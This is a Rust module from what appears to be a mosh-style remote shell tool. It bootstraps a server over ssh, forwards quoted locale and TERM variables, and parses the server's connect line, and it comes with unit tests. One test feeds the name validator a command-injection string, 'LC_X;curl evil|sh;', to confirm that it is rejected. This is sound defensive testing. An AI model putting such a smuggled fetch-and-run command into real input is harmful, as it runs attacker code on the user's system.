//! ssh bootstrap wrapper (mosh.pl port, simplified): run `posh server new`
//! on the remote host over ssh, parse the POSH IP / POSH CONNECT lines,
//! then run the UDP client locally with the key in the environment.

use std::io::{BufRead, BufReader};
use std::process::{Command, Stdio};

use crate::remote::datagram::Family;
use crate::util::{Error, Result};

pub struct SshOptions {
    pub family: Family,
    /// Server-side UDP port range, already validated ("P" or "P1:P2").
    pub port_range: Option<String>,
}

/// What the wrapped server reported on stdout.
#[derive(Debug, Default, PartialEq, Eq)]
pub struct ServerReport {
    pub ip: Option<String>,
    pub port: Option<u16>,
    pub key: Option<String>,
}

impl ServerReport {
    /// Feeds one line of server output; returns false for lines that are
    /// not part of the protocol (motd etc., to be passed through), true
    /// once the CONNECT line arrived (parsing is finished).
    pub fn feed(&mut self, line: &str) -> Result<bool> {
        if let Some(rest) = line.strip_prefix("POSH IP ") {
            let ip = rest.trim();
            if ip.is_empty() || ip.contains(char::is_whitespace) {
                return Err(Error(format!("bad POSH IP string: {line}")));
            }
            self.ip = Some(ip.to_string());
            return Ok(false);
        }
        if let Some(rest) = line.strip_prefix("POSH CONNECT ") {
            let (port, key) = parse_connect(rest)
                .ok_or_else(|| Error(format!("bad POSH CONNECT string: {line}")))?;
            self.port = Some(port);
            self.key = Some(key);
            return Ok(true);
        }
        Ok(false)
    }
}

/// Builds the remote command: locale variables forwarded as POSIX-sh
/// environment prefixes (LANG/LC_*, so the server sees the client's
/// charset), then `posh-server new` with the relevant flags — mosh
/// (`mosh-server new`) parity; the package installs posh-server as an
/// alias of posh.
pub fn remote_command(
    opts: &SshOptions,
    remote_cmd: &[String],
    locale_vars: &[(String, String)],
) -> String {
    let mut cmd = String::new();
    for (name, value) in locale_vars {
        cmd.push_str(name);
        cmd.push('=');
        cmd.push_str(&shell_quote(value));
        cmd.push(' ');
    }
    cmd.push_str("posh-server new");
    match opts.family {
        Family::Inet => cmd.push_str(" -4"),
        Family::Inet6 => cmd.push_str(" -6"),
        Family::Auto => {}
    }
    if let Some(range) = &opts.port_range {
        cmd.push_str(" -p ");
        cmd.push_str(range);
    }
    if !remote_cmd.is_empty() {
        cmd.push_str(" --");
        for arg in remote_cmd {
            cmd.push(' ');
            cmd.push_str(&shell_quote(arg));
        }
    }
    cmd
}

/// True for an env-var name safe to splice into a POSIX-sh assignment: only
/// `[A-Za-z_][A-Za-z0-9_]*`. Anything else (the kernel permits arbitrary
/// bytes except `=`/NUL in names) would break — or inject into — the remote
/// command string, since the name is emitted unquoted. github #6.
fn is_shell_safe_name(name: &str) -> bool {
    let mut chars = name.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Environment the remote `posh-server` should see: LANG + every LC_*
/// (charset, mosh parity) plus TERM and COLORTERM (posh#51 — so the session
/// shell isn't left with an empty TERM, which strands color-by-$TERM tools
/// like git and Charmbracelet TUIs). TERM rides as a *candidate*: the server
/// resolves it against its own terminfo DB (terminfo::resolve_term). Restricted
/// to names safe to emit as shell assignments.
///
/// Contract: `terminfo::session_env` (server side) reads TERM and COLORTERM
/// back out of `posh-server`'s process env, which is *only* populated because
/// they're in this filter. Dropping COLORTERM here silently regresses remote
/// truecolor (TERM degrades gracefully via resolve_term; COLORTERM has no
/// fallback). Keep the two sides in sync.
fn local_locale_vars() -> Vec<(String, String)> {
    std::env::vars()
        .filter(|(k, _)| {
            (k == "LANG" || k.starts_with("LC_") || k == "TERM" || k == "COLORTERM")
                && is_shell_safe_name(k)
        })
        .collect()
}

pub fn run(target: &str, remote_cmd: &[String], opts: &SshOptions) -> Result<()> {
    let server_cmd = remote_command(opts, remote_cmd, &local_locale_vars());

    let mut ssh = Command::new("ssh");
    match opts.family {
        Family::Inet => {
            ssh.arg("-4");
        }
        Family::Inet6 => {
            ssh.arg("-6");
        }
        Family::Auto => {}
    }
    let mut child = ssh
        .arg(target)
        .arg("--")
        .arg(&server_cmd)
        .stdin(Stdio::inherit()) // keep the tty for auth prompts
        .stdout(Stdio::piped())
        .stderr(Stdio::inherit())
        .spawn()
        .map_err(|e| Error(format!("cannot exec ssh: {e}")))?;

    let stdout = child.stdout.take().expect("piped stdout");
    let mut report = ServerReport::default();
    for line in BufReader::new(stdout).lines() {
        let line = line?;
        if report.feed(&line)? {
            break;
        }
        if !line.starts_with("POSH ") {
            // Pass through motd and friends.
            println!("{line}");
        }
    }
    let _ = child.wait();

    let (Some(port), Some(key)) = (report.port, report.key) else {
        return Err(Error::from(
            "did not find posh server startup message \
             (is posh-server on the server's non-interactive PATH?)",
        ));
    };

    // Prefer the address the server reported (third field of its
    // $SSH_CONNECTION: the IP we actually reached it on); fall back to
    // resolving the hostname we dialed, as mosh.pl does.
    let fallback = target.rsplit('@').next().unwrap_or(target).to_string();
    let host = report.ip.unwrap_or(fallback);
    std::env::set_var("POSH_KEY", key);
    crate::remote::client::run(&host, port, opts.family)
}

fn parse_connect(rest: &str) -> Option<(u16, String)> {
    let mut words = rest.split_whitespace();
    let port: u16 = words.next()?.parse().ok()?;
    let key = words.next()?;
    if key.len() != 22 || words.next().is_some() {
        return None;
    }
    Some((port, key.to_string()))
}

fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_connect_line() {
        assert_eq!(
            parse_connect("60001 AAAAAAAAAAAAAAAAAAAAAA"),
            Some((60001, "AAAAAAAAAAAAAAAAAAAAAA".to_string()))
        );
        assert_eq!(parse_connect("60001 shortkey"), None);
        assert_eq!(parse_connect("notaport AAAAAAAAAAAAAAAAAAAAAA"), None);
        assert_eq!(parse_connect("60001 AAAAAAAAAAAAAAAAAAAAAA extra"), None);
    }

    #[test]
    fn shell_quote_escapes_single_quotes() {
        assert_eq!(shell_quote("plain"), "'plain'");
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
    }

    #[test]
    fn only_well_formed_env_names_are_forwarded() {
        assert!(is_shell_safe_name("LANG"));
        assert!(is_shell_safe_name("LC_CTYPE"));
        assert!(is_shell_safe_name("_x9"));
        assert!(!is_shell_safe_name("")); // empty
        assert!(!is_shell_safe_name("9LC")); // leading digit
        assert!(!is_shell_safe_name("LC_X;curl evil|sh;")); // metacharacters
        assert!(!is_shell_safe_name("LC X")); // space
    }

    #[test]
    fn server_report_prefers_posh_ip() {
        let mut report = ServerReport::default();
        assert_eq!(report.feed("Welcome to examplehost!").unwrap(), false);
        assert_eq!(report.feed("POSH IP 192.0.2.7").unwrap(), false);
        assert_eq!(
            report
                .feed("POSH CONNECT 60001 AAAAAAAAAAAAAAAAAAAAAA")
                .unwrap(),
            true
        );
        assert_eq!(report.ip.as_deref(), Some("192.0.2.7"));
        assert_eq!(report.port, Some(60001));
        assert_eq!(report.key.as_deref(), Some("AAAAAAAAAAAAAAAAAAAAAA"));
    }

    #[test]
    fn server_report_without_ip_line() {
        let mut report = ServerReport::default();
        assert!(report
            .feed("POSH CONNECT 60044 AAAAAAAAAAAAAAAAAAAAAA")
            .unwrap());
        assert_eq!(report.ip, None);
        assert_eq!(report.port, Some(60044));
    }

    #[test]
    fn server_report_rejects_garbage() {
        let mut report = ServerReport::default();
        assert!(report.feed("POSH CONNECT nope nope").is_err());
        assert!(report.feed("POSH IP ").is_err());
        assert!(report.feed("POSH IP two words").is_err());
    }

    #[test]
    fn remote_session_attach_composition_quotes_inner_argv() {
        // RFC 0001 §2: `posh host:grp/my dev` rides as the server's
        // command, every element shell-quoted (lossless argv, as in fork).
        let opts = SshOptions {
            family: Family::Auto,
            port_range: None,
        };
        let inner: Vec<String> = ["posh", "-g", "grp", "attach", "my dev"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let cmd = remote_command(&opts, &inner, &[]);
        assert_eq!(
            cmd,
            "posh-server new -- 'posh' '-g' 'grp' 'attach' 'my dev'"
        );
    }

    #[test]
    fn remote_command_includes_flags_and_locale() {
        let opts = SshOptions {
            family: Family::Inet6,
            port_range: Some("60100:60200".to_string()),
        };
        let locale = vec![("LANG".to_string(), "en_US.UTF-8".to_string())];
        let cmd = remote_command(&opts, &["htop".to_string(), "-d".to_string()], &locale);
        assert_eq!(
            cmd,
            "LANG='en_US.UTF-8' posh-server new -6 -p 60100:60200 -- 'htop' '-d'"
        );

        let plain = remote_command(
            &SshOptions {
                family: Family::Auto,
                port_range: None,
            },
            &[],
            &[],
        );
        assert_eq!(plain, "posh-server new");
    }

    #[test]
    fn remote_command_forwards_term_and_colorterm_as_prefixes() {
        // posh#51: TERM/COLORTERM ride the same env-prefix path as LANG, so the
        // session shell isn't stranded with an empty TERM. Values are shell-
        // quoted; the server resolves TERM against its own terminfo DB.
        let opts = SshOptions {
            family: Family::Auto,
            port_range: None,
        };
        let env = vec![
            ("TERM".to_string(), "xterm-kitty".to_string()),
            ("COLORTERM".to_string(), "truecolor".to_string()),
        ];
        let cmd = remote_command(&opts, &[], &env);
        assert_eq!(
            cmd,
            "TERM='xterm-kitty' COLORTERM='truecolor' posh-server new"
        );
    }

    #[test]
    fn forwarded_var_filter_admits_term_colorterm_lang_lc_only() {
        // The membership predicate local_locale_vars applies, tested directly
        // (not via process env, which is global and racy under parallel tests).
        let admit = |k: &str| {
            (k == "LANG" || k.starts_with("LC_") || k == "TERM" || k == "COLORTERM")
                && is_shell_safe_name(k)
        };
        assert!(admit("TERM"));
        assert!(admit("COLORTERM"));
        assert!(admit("LANG"));
        assert!(admit("LC_ALL"));
        assert!(!admit("PATH"));
        assert!(!admit("POSH_KEY"));
    }
}
